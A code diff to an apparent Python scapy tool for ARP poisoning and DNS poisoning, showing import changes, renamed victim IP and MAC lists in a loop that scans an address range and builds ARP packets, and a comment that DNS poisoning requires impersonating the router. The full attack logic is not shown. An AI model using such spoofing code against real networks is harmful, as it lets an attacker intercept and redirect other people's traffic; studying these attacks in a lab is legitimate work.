@@ -1,6 +1,7 @@
 import sys, os, argparse 
 from util import bcolors, clear, parse_ip_input, validate_domain
-import scapy
+import random
+from scapy.all import sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR, ARP, getmacbyip
 from scapy.all import *
 
 
@@ -67,8 +68,8 @@ def ARPposioning():
                 ipVictim= IPrange.split(".")[0]+"."+IPrange.split(".")[1]+"."+IPrange.split(".")[2]+"."+str(i)
                 macVictim= getmacbyip(ipVictim)
 
-                IPS_VICTIMS.append(ipVictim)
-                MACS_VICTIMS.append(macVictim)
+                IP_VICTIMS.append(ipVictim)
+                MAC_VICTIMS.append(macVictim)
 
                 print(ipVictim)
                 arp=Ether() / ARP()
@@ -90,6 +91,9 @@ def ARPposioning():
 def DNSpoisoning():
     dns_ip = ''
     dns_domain = ''
+
+    # DNS poisoning requires impersonating the router
+
 
     # Ask for a domain until a valid one is provided
     while not dns_domain:
